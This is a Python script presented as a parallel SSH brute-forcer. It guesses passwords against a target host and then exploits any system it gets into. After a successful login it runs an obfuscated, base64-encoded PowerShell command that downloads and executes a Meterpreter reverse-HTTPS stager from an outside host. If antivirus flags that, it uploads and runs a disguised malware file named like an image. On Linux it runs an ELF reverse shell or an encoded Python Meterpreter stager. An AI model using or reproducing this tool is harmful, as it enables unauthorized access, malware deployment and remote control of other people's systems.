import paramiko
import multiprocessing
import sys,socket
from colorama import Fore
from tqdm import tqdm

print(Fore.RED + """
╦  ╦╦╔═╗╔═╗╦═╗
╚╗╔╝║╠═╝║╣ ╠╦╝
 ╚╝ ╩╩  ╚═╝╩╚═ """ + Fore.WHITE + "Parallel SSH Bruteforcer V1.2" + Fore.RESET)
 
# Configuration
host = '10.1.1.37'  # SSH host
port = 22  # SSH port
username = 'IEUser'  # SSH username
password_file = 'passwords.txt'  # File containing passwords
num_processes = 5  # Number of processes max limit is 5

# Windows Config
windows_malware = "windows_updater.png" # Windows reverse shell filename
remote_directory = "C:\\System\\" # Create directory on target 
windows_local_path = "Files/" + windows_malware  # File to upload on windows server
windows_remote_path = "C:\\System\\" + windows_malware # Path to write file to on target server

# Linux Config
linux_malware = "update.elf" # Linux reverse shell filename
linux_local_path = "Files/" + linux_malware # File to upload Linux server
linux_remote_path = "/tmp/" + linux_malware # Path to write file to on target server

print(Fore.WHITE + "[" + Fore.RED + "Target" + Fore.WHITE + "] " + Fore.WHITE + host + Fore.RESET)
print(Fore.WHITE + "[" + Fore.RED + "Bruteforcing Account" + Fore.WHITE + "] " + Fore.WHITE + username + Fore.RESET)
print(Fore.WHITE + "[" + Fore.RED + "Processes Running" + Fore.WHITE + "] ", Fore.WHITE, num_processes, Fore.RESET)

password_found = multiprocessing.Value('i', 0)  # Global variable to track if password is found

def ssh_login(credentials):
    hostname, port, username, password = credentials

    # Create an SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Attempt to connect to the SSH server
        client.connect(hostname, port, username, password, allow_agent=False,look_for_keys=False,timeout=5)

        # Authentication succeeded
        print(Fore.WHITE + "[" + Fore.RED + "Password Cracked" + Fore.WHITE + "] " + Fore.WHITE + password + Fore.RESET)
        password_found.value = 2
        
        # Exploitation Execute commands on server
        stdin, stdout, stderr = client.exec_command("cmd.exe /c 'systeminfo' | systeminfo")
        if 'Windows' in stdout.read().decode():
            print(Fore.WHITE + "\n[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
            print(Fore.RED + "    └──=> " + Fore.WHITE + "Windows System Detected" + Fore.RESET)
            print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Executing windows/meterpreter/reverse_https in Memory" + Fore.RESET)
            stdin, stdout, stderr = client.exec_command("""powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsAJABsAEkAZQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJABsAEkAZQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAGwASQBlAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxAC4AMQAuADEAMQAzADoAOAAwADgAMAAvAEoAOQBaAEsAZwBHAHMARgBCAGcAQQAvAGIANABzAGgASQA0AEwAcABpAEgAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAwAC4AMQAuADEALgAxADEAMwA6ADgAMAA4ADAALwBKADkAWgBLAGcARwBzAEYAQgBnAEEAJwApACkAOwA=&""")
            
            
            if 'contains malicious content' in stderr.read().decode():
                print(Fore.RED + "    └──=> [!] " + Fore.WHITE + "Malicious Script Detected" + Fore.RESET) 
                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Changing Exploit Method " + Fore.RESET)  

                try:
	                sftp = client.open_sftp()
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Creating System Directory" + Fore.RESET)
	                sftp.mkdir(remote_directory)
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Uploading Malware to System folder" + Fore.RESET)
	                sftp.put(windows_local_path, windows_remote_path)
	                sftp.close()
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Upload Successful " + windows_remote_path +  Fore.RESET)
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Detonating Malware " + windows_malware + Fore.RESET)
	                client.exec_command(windows_remote_path)
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Happy Hacking" + Fore.RESET)
	                password_found.value = 1
                except Exception as fd:
	                print(Fore.RED + "    └──=> " + "[!] " + Fore.WHITE + f"{str(fd)}" + Fore.RESET)
	                password_found.value = 1
	                
            else:
                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Happy Hacking" + Fore.RESET)
                password_found.value = 1
        else:
            print(Fore.WHITE + "\n[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
            print(Fore.RED + "    └──=> " + Fore.WHITE + "Linux System Detected" + Fore.RESET)
            
            stdin, stdout, stderr = client.exec_command("python -V")
            if 'not found' in stderr.read().decode():
                print(Fore.RED + "    └──=> [!] " + Fore.WHITE + "Python not installed" + Fore.RESET)
                
                try:
	                sftp = client.open_sftp()
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Uploading Malware to /tmp folder" + Fore.RESET)
	                sftp.put(linux_local_path, linux_remote_path)
	                sftp.close()
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Upload Successful " + linux_remote_path + Fore.RESET)
	                client.exec_command("cd /tmp/ && chmod +x " + linux_malware + " && ./" + linux_malware)
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Detonating Malware " + linux_malware + Fore.RESET)
	                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Happy Hacking" + Fore.RESET)
	                password_found.value = 1
                except Exception as fd:
	                print(Fore.RED + "    └──=> " + "[!] " + Fore.WHITE + "Download Failed" + Fore.RESET)
	                password_found.value = 1
            else:
                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Executing python/meterpreter/reverse_tcp_ssl in Memory" + Fore.RESET)
                client.exec_command('''python -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UEFOxDAMPDev6C2xCFFDyx5WlDtvQAi1qYGoaRLFWbaA+DvNdoUs2fLY4xnZLjGkXH87O8pxIDx0kshJCmbGLCmnk8ky2wXZW0j1Wltfp8G/o9ANHFmV09eWKwr9zlB7EXdSwwVXJniPJgvBdaN0Cd1y2XVtC5eNfpNT5zTE1yuVQsHHhMPMKlwNxlwkigdFDjGKe2Cu362pk4+DmQV/fOKSVELzKTqA5+aFTf21d8DOH9Zh7dCLCR7cdm66+Z/e7jAwXNGI8gg1oQlLTEgk9p+o8dAVcMKyKX848SP9AvsDUt9jIA==')[0])))"''')
                print(Fore.RED + "    └──=> " + Fore.BLUE + "[*] " + Fore.WHITE + "Happy Hacking" + Fore.RESET)
              
                password_found.value = 1
            
    except socket.error:
        print(Fore.WHITE + "[" + Fore.RED + "Connection Error" + Fore.WHITE + "] " + Fore.WHITE + "Account Locked" )
        password_found.value = 1
    except paramiko.AuthenticationException:
        # Authentication failed
        pass
    except Exception as e:
        # Connection error
        password_found.value = 1
        print(Fore.WHITE + "[" + Fore.RED + "Error" + Fore.WHITE + "] " + Fore.WHITE + f"{str(e)}" + Fore.RESET)

    # Close the SSH client
    client.close()

def read_passwords_from_file(filename):
    passwords = []
    with open(filename, 'r') as file:
        lines = file.readlines()
        print(Fore.WHITE + "[" + Fore.RED + "SSH Login Attempts" + Fore.WHITE + "]", Fore.WHITE, len(lines), Fore.RESET)
        for line in lines:
            password = line.strip()
            if password:
                passwords.append(password)
    return passwords

def generate_credentials_with_passwords(host, port, username, passwords):
    credentials = []
    for password in passwords:
        credentials.append((host, port, username, password))
    return credentials

def multi_process_ssh_login(credentials, num_processes):
    # Create a process pool
    pool = multiprocessing.Pool(processes=num_processes)

    # Apply the SSH login function to each set of credentials in parallel
    with tqdm(total=len(credentials), desc='[Bruteforcing]', colour="white", unit='passwords') as pbar:
        results = []
        for _ in pool.imap_unordered(ssh_login, credentials):
            pbar.update()
            results.append(_)
            if password_found.value == 1:
                pool.terminate()  # Terminate all workers
                pool.join()
                sys.exit()  # Quit the program
                
            if password_found.value == 2:
                pbar.close()

    # Close the process pool
    pool.close()
    pool.join()

    # Print any results from the results list
    for result in results:
        if result is not None:
            print(result)

# Read passwords from file
passwords = read_passwords_from_file(password_file)

# Generate credentials with passwords
credentials_with_passwords = generate_credentials_with_passwords(host, port, username, passwords)

# Run the multi-processor SSH login
multi_process_ssh_login(credentials_with_passwords, num_processes)

